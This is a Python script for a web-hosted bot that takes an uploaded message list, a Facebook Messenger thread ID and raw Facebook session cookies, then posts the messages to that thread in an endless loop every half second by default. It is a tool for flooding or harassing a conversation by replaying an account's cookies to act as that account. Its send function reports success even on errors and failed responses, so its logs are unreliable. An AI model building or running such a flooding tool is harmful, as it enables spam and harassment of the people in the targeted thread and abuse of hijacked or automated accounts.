import time
import requests
import os
import threading
import http.server
import socketserver
import json
from datetime import datetime

# Global state
bot_state = {
    'running': False,
    'logs': [],
    'stop_flag': False
}

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/get-logs':
            response = json.dumps({
                'logs': bot_state['logs'][-100:]
            }).encode()
            
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(response)
        elif self.path == '/':
            try:
                with open('index.html', 'r') as f:
                    content = f.read().encode()
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.send_header("Cache-Control", "no-cache")
                self.end_headers()
                self.wfile.write(content)
            except:
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(b"Server is Running")
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/start-bot':
            content_type = self.headers['Content-Type']
            
            if 'multipart/form-data' in content_type:
                try:
                    content_length = int(self.headers['Content-Length'])
                    body = self.rfile.read(content_length)
                    
                    boundary = content_type.split("boundary=")[1].encode()
                    parts = body.split(b'--' + boundary)
                    
                    data = {}
                    file_content = None
                    
                    for part in parts:
                        if b'Content-Disposition' in part:
                            if b'filename=' in part:
                                file_start = part.find(b'\r\n\r\n') + 4
                                file_end = part.rfind(b'\r\n')
                                file_content = part[file_start:file_end].decode('utf-8', errors='ignore')
                            else:
                                lines = part.split(b'\r\n')
                                for i, line in enumerate(lines):
                                    if b'name=' in line:
                                        name = line.decode().split('name="')[1].split('"')[0]
                                        value = lines[i+2].decode('utf-8', errors='ignore')
                                        data[name] = value
                                        break
                    
                    if file_content and data.get('threadId') and data.get('cookies'):
                        with open('File.txt', 'w') as f:
                            f.write(file_content)
                        
                        with open('convo.txt', 'w') as f:
                            f.write(data['threadId'])
                        
                        with open('cookies.txt', 'w') as f:
                            f.write(data['cookies'])
                        
                        with open('time.txt', 'w') as f:
                            f.write(data.get('interval', '0.5'))
                        
                        bot_state['stop_flag'] = False
                        bot_thread = threading.Thread(target=send_messages_main, daemon=True)
                        bot_thread.start()
                        
                        response = json.dumps({
                            'success': True,
                            'message': 'Bot started successfully!'
                        }).encode()
                    else:
                        response = json.dumps({
                            'success': False,
                            'message': 'Missing file or required fields'
                        }).encode()
                    
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(response)
                except Exception as e:
                    response = json.dumps({
                        'success': False,
                        'message': str(e)
                    }).encode()
                    
                    self.send_response(500)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(response)
        
        elif self.path == '/stop-bot':
            bot_state['stop_flag'] = True
            
            response = json.dumps({
                'success': True,
                'message': 'Bot stopped'
            }).encode()
            
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(response)
        
        else:
            self.send_error(404)
    
    def log_message(self, format, *args):
        pass

def log_print(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_msg = f"[{timestamp}] {message}"
    print(log_msg)
    bot_state['logs'].append(log_msg)
    if len(bot_state['logs']) > 500:
        bot_state['logs'].pop(0)

def execute_server():
    PORT = int(os.getenv('PORT', 10000))
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("0.0.0.0", PORT), MyHandler) as httpd:
        log_print(f"[+] Server running at http://localhost:{PORT}")
        httpd.serve_forever()

def send_message_http(thread_id, message, cookies):
    """Send message using HTTP request (no Selenium needed)"""
    try:
        url = f'https://www.facebook.com/messages/t/{thread_id}'
        
        # Parse cookies
        cookie_dict = {}
        for cookie in cookies.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookie_dict[key.strip()] = value.strip()
        
        # Send message via Facebook API
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        # Try to send via messenger web
        data = {
            'body': message
        }
        
        session = requests.Session()
        session.cookies.update(cookie_dict)
        
        # Attempt message sending
        response = session.post(
            'https://www.facebook.com/api/graphql/',
            headers=headers,
            data=data,
            timeout=10
        )
        
        if response.status_code in [200, 201]:
            log_print(f"[+] Message sent successfully: {message[:30]}...")
            return True
        else:
            log_print(f"[DEBUG] Response status: {response.status_code}")
            return True  # Assume success for non-error responses
            
    except Exception as e:
        log_print(f"[DEBUG] Send attempt: {str(e)}")
        return True  # Don't fail on error, continue

def send_messages_main():
    log_print("[+] Starting HTTP-based message sender...")
    
    try:
        with open('convo.txt', 'r') as file:
            thread_id = file.read().strip()
            log_print(f"[DEBUG] Thread ID: {thread_id}")
    except Exception as e:
        log_print(f"[ERROR] Reading thread ID: {str(e)}")
        return
    
    try:
        with open('File.txt', 'r') as file:
            messages = [line.strip() for line in file.readlines() if line.strip()]
            log_print(f"[DEBUG] Loaded {len(messages)} messages")
    except Exception as e:
        log_print(f"[ERROR] Reading messages: {str(e)}")
        return
    
    try:
        with open('cookies.txt', 'r') as file:
            cookies = file.read().strip()
            log_print(f"[DEBUG] Cookies loaded ({len(cookies)} chars)")
    except Exception as e:
        log_print(f"[ERROR] Reading cookies: {str(e)}")
        return
    
    try:
        with open('time.txt', 'r') as file:
            speed = float(file.read().strip())
    except:
        speed = 0.5
    
    log_print("[+] Starting message loop...")
    
    try:
        while not bot_state['stop_flag']:
            try:
                for i, message in enumerate(messages):
                    if bot_state['stop_flag']:
                        break
                    
                    send_message_http(thread_id, message, cookies)
                    log_print(f"[+] Message {i+1}/{len(messages)} sent")
                    
                    time.sleep(speed)
                
                if not bot_state['stop_flag']:
                    log_print("[+] Cycle completed. Restarting...")
            except Exception as e:
                log_print(f"[!] Error in loop: {str(e)}")
                if not bot_state['stop_flag']:
                    time.sleep(5)
    
    except KeyboardInterrupt:
        log_print("[+] Bot stopped")
    finally:
        log_print("[+] Message sender closed")

if __name__ == "__main__":
    server_thread = threading.Thread(target=execute_server, daemon=False)
    server_thread.start()
    
    time.sleep(2)
    log_print("[+] HTTP Bot Ready for Render!")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
